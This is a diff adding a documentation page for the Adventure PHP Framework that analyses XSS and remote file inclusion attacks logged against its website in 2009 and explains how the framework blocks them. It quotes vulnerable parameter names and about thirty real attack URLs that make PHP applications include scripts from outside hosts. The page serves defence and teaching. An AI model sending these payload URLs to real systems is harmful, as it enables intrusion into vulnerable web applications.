@@ -1,0 +1,142 @@
+<doku:title parent="100" tags="xss,bullet proof,schutz vor xss,secure by design,hacker proof" title="Hacking &amp; das APF 2009/2010" urlname="Hacking-und-das-APF-2009-2010">
+  Der Artikel Hacking &amp; das APF 2009/2010 zeigt, wie die APF-Webseite durch das Framework
+  erfolgreich vor XSS-Attacken gesch&uuml;tzt werden konnte.
+</doku:title>
+<h3 id="Chapter-1-Einleitung"><a href="#Chapter-1-Einleitung">1. Einleitung</a></h3>
+<p>
+   In 2009, a drastic increase of XSS and code injection attacks could be recognized on the APF web
+   site. Analyzing the log files, we found <em>92.334</em> known attacks that were catched by the
+   framework and a total number of <em>672.152</em> attacks.
+</p>
+<p>
+   Thus, this article should describe, which mechanisms are included in the APF to face this danger
+   and to secure your custom application.
+</p>
+
+<h3 id="Chapter-2-Attacks"><a href="#Chapter-2-Attacks">2. Attacks</a></h3>
+<h4 id="Chapter-2-1-Kind-of-attacks"><a href="#Chapter-2-1-Kind-of-attacks">2.1. Kind of attacks</a></h4>
+<p>
+   As described in the article <int:link pageid="060" lang="de"/> (german), most of the attacks are
+   XSS and code injection attacks. They try to exploit vulnerabilities to inject third party content
+   or code into the target application. Fortunately, the signature of these attacks is similar in
+   95% of the attacks. Here is the pattern description:
+</p>
+<gen:highlight type="code">[?|&amp;]vulnerability_param=http://domain.tld/some/path/injection_code.ext</gen:highlight>
+<p>Merely, the name of the parameter differs from request to request:</p>
+<ul>
+   <li>tpl_pgb_moddir</li>
+   <li>page</li>
+   <li>mosConfig_absolute_path</li>
+   <li>sourcedir</li>
+   <li>file</li>
+   <li>dir[inc]</li>
+   <li>includedir</li>
+   <li>phpbb_root_path</li>
+   <li>_SERVER[DOCUMENT_ROOT]</li>
+   <li>_zb_path</li>
+   <li>cfg[path][contenido]</li>
+   <li>base_folder</li>
+   <li>spaw_root</li>
+   <li>includePath</li>
+</ul>
+<p>
+   The subsequent code box contains a selection of urls, that have been used to display third party
+   content on the APF web page or to inject third party code into the APF:
+</p>
+<gen:highlight type="code">
+/!rfihttp://www.nicheresaleprofits.com/cbmarketer/image/id??
+/!scan23http://sito.blackdrag0n.net/Cartoon/idnew.txt?
+/%20%20//////?_SERVER[DOCUMENT_ROOT]=http://www.koreadefence.net/data/shirohige/zfxid.txt??
+/%20%20//?_shop_path=http://emwave.knu.ac.kr/bbs/skin/happycast_category_brown/fx29id.txt???
+/%20%20//?mosconfig_absolute_path=http://largeface.com/gnuboard4/gnus/fxid.txt?
+/%20%20//inc/functions_inc.php?gb_pfad=http://82.146.51.16/scan/copyright.txt??
+/%20%20//includes/DProtect/Framework/EmailTemplates.class.php?GLOBALS[RootPath]=http://www.junggosum.com/bbs/data/sports_2/idxx.txt??
+/%20%20//modules/Forums/admin/index.php?phpbb_root_path=http://n34.biz/id1.txt???
+/%20%20//tools/send_reminders.php?noSet=0&amp;includedir=http://jnhsolutions.com.au/datingsite/temp/userimages/1.txt??
+/%20%20/e404.php?DOCUMENT_ROOT=http://alandar.net/www2/log1.txt?
+/?mosConfig_absolute_path=http://MiNgOnIsHoW.altervista.org/ArEa511/ideal.txt????
+/?dir_ws=http://champrond-en-gatine.org//administrator/components/com_joomla-visites/core/include/updates/v6id.txt??????
+/?_zb_path=http://kb27.co.kr/bbs///data/cok.txt??
+/tools/send_reminders.php?includedir=http://208.98.22.241/id.txt??%0D??
+/?autoLoadConfig[999][0][autoType]=include&amp;autoLoadConfig[999][0][loadFile]=http://204.3.167.134/xxx?
+/modules/My_eGallery/index.php?basepath=http://urogyn.co.kr/uro/install/idxx.txt??
+/show_news.php?cutepath=http://laloggia.by.ru/up/ctrl.txt??
+/skin/zero_vote/setup.php?dir=http://206.126.97.21/~talagaho/id.txt???
+/Neos_Chronos/header.php?base_folder=http://www.jocainmo.es/img/.z/d??
+/buscar.php?query=http://www.candidography.com/id1.txt??
+/?_PHPLIB[libdir]=http://cdshop.net.ru////cron/hjr.txt??
+/inc/cmses/aedating4CMS.php?dir[inc]=http://daiyangmetal.co.kr/intranet/zb/skin/ggambo5100_gallery//colby/id.txt??
+/naboard_pnr.php?skin=http://www.cinepopbrasil.com.br/sistem.txt???
+/phpSecurePages/secure.php?&amp;cfgProgDir=http://www.steannareptile.it//administrator/idi.txt???
+/phpwcms/include/inc_ext/spaw/dialogs/table.php?spaw_root=http://tdaa.by.ru/safe.txt???
+/skin/ggambo7002_board/contact.php?dir=http://hana.nef-i.co.kr/pds/zfxid1.txt??
+/jahoot.com/search.php?=http://www.chicagofc.co.kr/fitness/data/come/fx29id1.txt??
+/PNphpBB2/includes/functions_admin.php?phpbb_root_path=http://laloggia.by.ru/up/ctrl.txt??
+/components/com_htmlarea3_xtd-c/popups/ImageManager/config.inc.php?http://musicadelibreria.net/footer??
+/Page//wp-content/plugins/dm-albums/template/album.php?SECURITY_FILE=http://kb27.co.kr/bbs///data/cok.txt??
+</gen:highlight>
+<p>
+   The files
+   <a href="http://media.adventure-php-framework.org/content/xss_report_2009_with_urls_grouped.txt.gz" title="xss_report_2009_with_urls_grouped.txt.gz">xss_report_2009_with_urls_grouped.txt.gz</a>
+   and
+   <a href="http://media.adventure-php-framework.org/content/xss_report_2009_with_urls_uniq.txt.gz" title="xss_report_2009_with_urls_uniq.txt.gz">xss_report_2009_with_urls_uniq.txt.gz</a>
+   contain a variety of urls, that have been used during 2009 attacks.
+   <em>xss_report_2009_with_urls_uniq.txt.gz</em> contains a complete list of urls,
+   <em>xss_report_2009_with_urls_grouped.txt.gz</em> contains a grouped list with identical base urls.
+</p>
+
+<h4 id="Chapter-2-2-Reported-attacks"><a href="#Chapter-2-2-Reported-attacks">2.2. Reported attacks</a></h4>
+<p>
+   After having checked Apache's access logfiles, we started to analyze the application log files.
+   This effort resulted in 3 groups of attacks. All of them tried to manipulate the url to inject
+   content or code to the application:
+</p>
+<gen:highlight type="code">
+parse_url(/Seite/048-Webseite-erstellen%20%20/page.php?doc=http://unixstats.org/tools/idxx.txt??): Unable to parse URL (Number: 2, File: ***/apps/tools/link/frontcontrollerLinkHandler.php, Line: 306)
+[Document::__loadContentFromFile()] Design "Seite" not existent in namespace "modules::comments::pres::templates"! Please check your template code (&lt;29e6fe038415c51c1bbac0271949edf5 /&gt;&lt;a name=&quot;comments&quot;&gt;&lt;/a&gt;&lt;h2&gt;&lt;html:getstring namespace=&quot;modules::comments&quot; config=&quot;language&quot; entry=&quot;header.title&quot; /&gt;&lt;/h2&gt;&lt;68a3d33630357505bfe4dd96dbcb492e /&gt;). (Number: 256, File: ***/apps/core/pagecontroller/pagecontroller.php, Line: 1378)
+[Frontcontroller::__parseActions()] No config section for action key "setLangu" available in configuration file "***_actionconfig.ini" in namespace "sites::demosite::biz::actions" and context "sites::***"! (Number: 256, File: ***/apps/core/frontcontroller/Frontcontroller.php, Line: 555)
+</gen:highlight>
+<p>
+   The <em>first line</em> is a try-out to inject external code. If the offender would have been
+   successful, the code is used to spy out information about the webserver and the application
+   running on the machine. Subsequent request are then used to explicitly manipulate the application
+   and the content.
+</p>
+<p>
+   In case the developer uses <int:link pageid="069" />, such attacks ara quite worthless, because
+   the <int:link pageid="087" anchor="Chapter-2-Input-filter">InputFilter</int:link> rewrites the
+   url to a generic param value couple.
+</p>
+<p>
+   In case the developer uses the APF components like the <int:link pageid="036">LinkHandler</int:link>
+   or the <int:link pageid="012" anchor="Chapter-2-4-Link-generation">FrontcontrollerLinkHandler</int:link>,
+   urls like presented above are recognized semantically invalid and an error is thrown. This error
+   can be caugth and logged by the integrated <int:link pageid="101"/> very easily.
+</p>
+<p>
+   The <em>second line</em> describes the attempt to manipulate a known parameter of the application
+   to display third party content. Potentially, the APF offers the chance to manipulare the template
+   included by the
+   <int:link pageid="046" anchor="Chapter-1-2-Importdesign">&lt;core:importdesign /&gt;</int:link>
+   taglib by changing the url, but the template path is created with security in mind.
+</p>
+<p>
+   In the <em>third line</em> the attacker tries to manipulate a param of a front controller action
+   to execute the desired action. Within the APF, actions are defined within a configuration file
+   and the url params only refer to this configuration. Hence, it is not possible to successfully
+   manipulate an action call by url.
+</p>
+
+<h3 id="Chapter-3-Error-handling"><a href="#Chapter-3-Error-handling">3. Error handling</a></h3>
+<p>
+   In order to not provide much information to the attacker, it is recommended to implement a
+   special <int:link pageid="101" anchor="Chapter-3-Enhancement">ErrorHandler</int:link> that logs
+   the upcoming errors to a log file and keeps quiet on the cause of the error.
+</p>
+<p>
+   The wiki page
+   <a class="wiki" href="http://wiki.adventure-php-framework.org/de/Script_kiddies_ErrorHandler" title="Script kiddies ErrorHandler">Script kiddies ErrorHandler</a> (german)
+   describes, how you can implement such a ErrorHandler.
+</p>
+
+<core:importdesign namespace="modules::comments::pres::templates" template="comment" categorykey="en_108" />
